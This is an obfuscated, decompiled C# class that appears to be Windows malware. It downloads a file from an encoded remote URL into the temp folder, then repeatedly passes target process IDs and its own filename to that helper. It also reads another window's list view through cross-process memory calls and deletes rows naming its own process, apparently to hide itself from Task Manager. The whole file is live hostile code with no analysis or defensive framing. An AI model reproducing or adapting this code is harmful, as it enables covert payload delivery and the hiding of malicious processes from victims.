using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace frgoWklvEOSV;

internal sealed class PmZcbpYMQkkuHdO
{
	private struct egOYnMsXOTjl
	{
		public uint ZZFIMbxLgzthaR;

		public IntPtr BxHIHExIvxZU;

		public IntPtr YRofDNnXGicoWU;

		public uint oNjdwbdRHgy;

		public uint nmVNOKbSciLW;

		public IntPtr TDlIPygpdst;

		public uint rLBeAZCTznQk;

		public int NYhBjqLGSmMKnsl;

		public IntPtr nQYKRLEKQiaDAB;
	}

	private static volatile bool NPrbAlPzPDdY;

	public static volatile bool zsxmbThfoIv;

	[NonSerialized]
	internal static GetString _0098;

	public static string swZUlVwSEWmJw()
	{
		if (IntPtr.Size == 8)
		{
			PFruJiQrcriiZ.KtQjokjXHZXUlt = vmqHVeneBD(new Uri(PFruJiQrcriiZ.GwTsezEgVAuVAU(_0098(107401192))));
		}
		else
		{
			PFruJiQrcriiZ.KtQjokjXHZXUlt = vmqHVeneBD(new Uri(PFruJiQrcriiZ.GwTsezEgVAuVAU(_0098(107400566))));
		}
		return PFruJiQrcriiZ.KtQjokjXHZXUlt;
	}

	public static string vmqHVeneBD(Uri P_0)
	{
		try
		{
			string path = Path.GetRandomFileName().Replace(_0098(107400388), _0098(107388746)).Remove(0, 3) + _0098(107400415);
			WebClient webClient = new WebClient();
			webClient.DownloadFile(P_0, Path.Combine(Path.GetTempPath(), path));
			return Path.Combine(Path.GetTempPath(), path);
		}
		catch
		{
		}
		return string.Empty;
	}

	public static Process bZgooWszMxOy(string P_0)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (process.ProcessName.Contains(P_0))
			{
				return process;
			}
		}
		return null;
	}

	public static void xRTdqUJOGhXP(string[] P_0)
	{
		string text = swZUlVwSEWmJw();
		if (string.IsNullOrEmpty(text))
		{
			return;
		}
		while (true)
		{
			foreach (string text2 in P_0)
			{
				Process process = bZgooWszMxOy(text2);
				if (process != null)
				{
					string text3 = process.Id.ToString();
					PFruJiQrcriiZ.KXNiSRaxzeIpPt(text, text3 + _0098(107386850) + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName));
					PFruJiQrcriiZ.KXNiSRaxzeIpPt(text, text3 + _0098(107386850) + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName) + _0098(107400406));
					PFruJiQrcriiZ.KXNiSRaxzeIpPt(text, text3 + _0098(107386850) + PFruJiQrcriiZ.GwTsezEgVAuVAU(_0098(107400365)));
					PFruJiQrcriiZ.KXNiSRaxzeIpPt(text, text3 + _0098(107386850) + PFruJiQrcriiZ.GwTsezEgVAuVAU(_0098(107387949)));
					PFruJiQrcriiZ.KXNiSRaxzeIpPt(text, text3 + _0098(107386850) + PFruJiQrcriiZ.GwTsezEgVAuVAU(_0098(107400372)));
					PFruJiQrcriiZ.KXNiSRaxzeIpPt(text, text3 + _0098(107386850) + PFruJiQrcriiZ.GwTsezEgVAuVAU(_0098(107400835)));
					PFruJiQrcriiZ.KXNiSRaxzeIpPt(text, text3 + _0098(107386850) + PFruJiQrcriiZ.GwTsezEgVAuVAU(_0098(107403449)));
					PFruJiQrcriiZ.KXNiSRaxzeIpPt(text, text3 + _0098(107386850) + PFruJiQrcriiZ.GwTsezEgVAuVAU(_0098(107400850)));
				}
			}
			Thread.Sleep(200);
		}
	}

	[DllImport("kernel32.dll", EntryPoint = "OpenProcess")]
	private static extern IntPtr RPEMJDxuanuQkV(int P_0, bool P_1, uint P_2);

	[DllImport("kernel32.dll", EntryPoint = "VirtualAllocEx", ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr aiCfMgeoiuTjUMzCV(IntPtr P_0, IntPtr P_1, uint P_2, int P_3, int P_4);

	[DllImport("kernel32.dll", EntryPoint = "VirtualFreeEx", ExactSpelling = true, SetLastError = true)]
	private static extern bool WltWtpWRTWkRb(IntPtr P_0, IntPtr P_1, uint P_2, int P_3);

	[DllImport("kernel32.dll", EntryPoint = "CloseHandle", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool aJKVhnqZopRo(IntPtr ieOfaJizIolWkYn);

	[DllImport("kernel32.dll", EntryPoint = "WriteProcessMemory", SetLastError = true)]
	private static extern bool SZgeTgVGzNrPn(IntPtr uhimDKeNmQmB, IntPtr QKkbIiEcaFDJ, byte[] pNHDpIOupPgB, uint gpzdSQiksmHIiE, out UIntPtr vAUrzrCfCWv);

	[DllImport("kernel32.dll", EntryPoint = "ReadProcessMemory", SetLastError = true)]
	private static extern bool blZEwnCUkJEzY(IntPtr sqKIEGwqjOHW, IntPtr YeBimhgZRdrex, [Out] byte[] VdMDasJSmq, int GdhqiIqbxsvAnB, out UIntPtr EzOMAaxrSvh);

	[DllImport("user32.dll", EntryPoint = "GetWindowThreadProcessId", SetLastError = true)]
	private static extern uint HllFOTPKedY(IntPtr eUDWVbRwyKtmjb, out uint rGOQidRuPe);

	[DllImport("user32.dll", CharSet = CharSet.Auto, EntryPoint = "SendMessage")]
	private static extern IntPtr iGDyvpgeHMXCzo(IntPtr P_0, uint P_1, IntPtr P_2, IntPtr P_3);

	[DllImport("user32.dll", EntryPoint = "FindWindow", SetLastError = true)]
	private static extern IntPtr aRxibHvjXJhU(string P_0, string P_1);

	[DllImport("user32.dll", EntryPoint = "FindWindowEx", SetLastError = true)]
	private static extern IntPtr UZszvSoVhQgbV(IntPtr P_0, IntPtr P_1, string P_2, string P_3);

	private static byte[] VpkAJizyuaj(object P_0)
	{
		int num = Marshal.SizeOf(P_0);
		byte[] array = new byte[num];
		IntPtr intPtr = Marshal.AllocHGlobal(num);
		Marshal.StructureToPtr(P_0, intPtr, fDeleteOld: true);
		Marshal.Copy(intPtr, array, 0, num);
		Marshal.FreeHGlobal(intPtr);
		return array;
	}

	private static IntPtr rBaNxPzSfHF(uint P_0)
	{
		return RPEMJDxuanuQkV(56, false, P_0);
	}

	private static void YJhUDGPhSkbuEf(IntPtr P_0)
	{
		aJKVhnqZopRo(P_0);
	}

	private static IntPtr YAqvBQGcLASTyDa(uint P_0, IntPtr P_1)
	{
		return aiCfMgeoiuTjUMzCV(P_1, IntPtr.Zero, P_0, 12288, 4);
	}

	private static void THoLmeHgblkyQDl(IntPtr P_0, IntPtr P_1, uint P_2)
	{
		WltWtpWRTWkRb(P_0, P_1, P_2, 32768);
	}

	private static IntPtr wpcUcLrVrFbBPg()
	{
		IntPtr intPtr = aRxibHvjXJhU(_0098(107400801), _0098(107400776));
		if (intPtr == IntPtr.Zero)
		{
			intPtr = aRxibHvjXJhU(_0098(107400743), _0098(107400766));
			intPtr = UZszvSoVhQgbV(intPtr, IntPtr.Zero, _0098(107400743), null);
			return UZszvSoVhQgbV(intPtr, IntPtr.Zero, _0098(107400717), _0098(107400728));
		}
		intPtr = UZszvSoVhQgbV(intPtr, IntPtr.Zero, _0098(107400743), null);
		return UZszvSoVhQgbV(intPtr, IntPtr.Zero, _0098(107400717), _0098(107400683));
	}

	private static IntPtr VRSjNGIqMPxxrf(IntPtr P_0)
	{
		return iGDyvpgeHMXCzo(P_0, 4100u, IntPtr.Zero, IntPtr.Zero);
	}

	private static void sovqNCrbRXgkN(IntPtr P_0, IntPtr P_1)
	{
		iGDyvpgeHMXCzo(P_0, 4104u, P_1, IntPtr.Zero);
	}

	private static void FQsCBkWkZKJYOA(IntPtr P_0)
	{
		iGDyvpgeHMXCzo(P_0, 4124u, IntPtr.Zero, IntPtr.Zero);
	}

	private static string MRonfAkACEl(IntPtr P_0, IntPtr P_1)
	{
		byte[] array = new byte[50];
		egOYnMsXOTjl egOYnMsXOTjl = default(egOYnMsXOTjl);
		HllFOTPKedY(P_0, out var rGOQidRuPe);
		IntPtr intPtr = rBaNxPzSfHF(rGOQidRuPe);
		IntPtr intPtr2 = YAqvBQGcLASTyDa((uint)Marshal.SizeOf(egOYnMsXOTjl), intPtr);
		IntPtr intPtr3 = YAqvBQGcLASTyDa(50u, intPtr);
		egOYnMsXOTjl.BxHIHExIvxZU = P_1;
		egOYnMsXOTjl.YRofDNnXGicoWU = (IntPtr)0;
		egOYnMsXOTjl.rLBeAZCTznQk = 50u;
		egOYnMsXOTjl.TDlIPygpdst = intPtr3;
		SZgeTgVGzNrPn(intPtr, intPtr2, VpkAJizyuaj(egOYnMsXOTjl), (uint)Marshal.SizeOf(egOYnMsXOTjl), out var vAUrzrCfCWv);
		iGDyvpgeHMXCzo(P_0, 4141u, P_1, intPtr2);
		blZEwnCUkJEzY(intPtr, intPtr3, array, 50, out vAUrzrCfCWv);
		THoLmeHgblkyQDl(intPtr, intPtr2, (uint)Marshal.SizeOf(egOYnMsXOTjl));
		THoLmeHgblkyQDl(intPtr, intPtr3, 50u);
		YJhUDGPhSkbuEf(intPtr);
		return Encoding.ASCII.GetString(array);
	}

	private static void eYeipYCyEPEx(string P_0)
	{
		IntPtr intPtr = wpcUcLrVrFbBPg();
		if (!(intPtr != IntPtr.Zero))
		{
			return;
		}
		int num = (int)VRSjNGIqMPxxrf(intPtr);
		for (int i = 0; i < num; i++)
		{
			string text = MRonfAkACEl(intPtr, (IntPtr)i);
			if (text.Contains(P_0))
			{
				sovqNCrbRXgkN(intPtr, (IntPtr)i);
			}
		}
	}

	private static void RkWwqjeVZT()
	{
		IntPtr intPtr = wpcUcLrVrFbBPg();
		if (intPtr != IntPtr.Zero)
		{
			FQsCBkWkZKJYOA(intPtr);
			FQsCBkWkZKJYOA(intPtr);
			FQsCBkWkZKJYOA(intPtr);
			FQsCBkWkZKJYOA(intPtr);
			FQsCBkWkZKJYOA(intPtr);
		}
	}

	public static void SmzpdOGqBUsqf()
	{
		Thread thread = new Thread(YuQxyPaMUrM);
		thread.Start();
	}

	private static void YuQxyPaMUrM()
	{
		while (!NPrbAlPzPDdY)
		{
			if (zsxmbThfoIv)
			{
				eYeipYCyEPEx(Process.GetCurrentProcess().ProcessName + _0098(107400415));
				Thread.Sleep(525);
			}
			else
			{
				RkWwqjeVZT();
				Thread.Sleep(1000);
			}
		}
		NPrbAlPzPDdY = false;
	}

	static PmZcbpYMQkkuHdO()
	{
		Strings.CreateGetStringDelegate(typeof(PmZcbpYMQkkuHdO));
		NPrbAlPzPDdY = false;
		zsxmbThfoIv = true;
	}
}
